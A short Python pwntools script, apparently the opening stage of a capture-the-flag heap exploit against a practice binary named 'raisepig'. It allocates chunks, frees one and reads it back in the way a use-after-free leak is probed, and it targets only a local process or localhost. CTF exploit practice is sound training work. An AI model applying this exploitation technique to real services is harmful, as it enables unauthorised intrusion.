#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *
from time import sleep
import sys
context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

if sys.argv[1] == "l":
    io = process("./raisepig", env = {"LD_PRELOAD": "./libc-64"})

else:
    io = remote("localhost", 9999)

elf = ELF("./libc-64")
libc = ELF("./libc-64")

def DEBUG():
	raw_input("DEBUG: ")
	gdb.attach(io)

def Raise(length, name, tp):
    io.sendlineafter(" : ", "1")
    io.sendlineafter(" :", str(length))
    io.sendlineafter(" :", name)
    io.sendlineafter(" :", tp)

def visit():
    io.sendlineafter(" : ", "2")

def eat(idx):
    io.sendlineafter(" : ", "3")
    io.sendlineafter(":", str(idx))

if __name__ == "__main__":
    Raise(160, '0000', '0000')
    Raise(160, '1111', '1111')
    eat(0)
    visit()

    io.interactive()
    io.close()

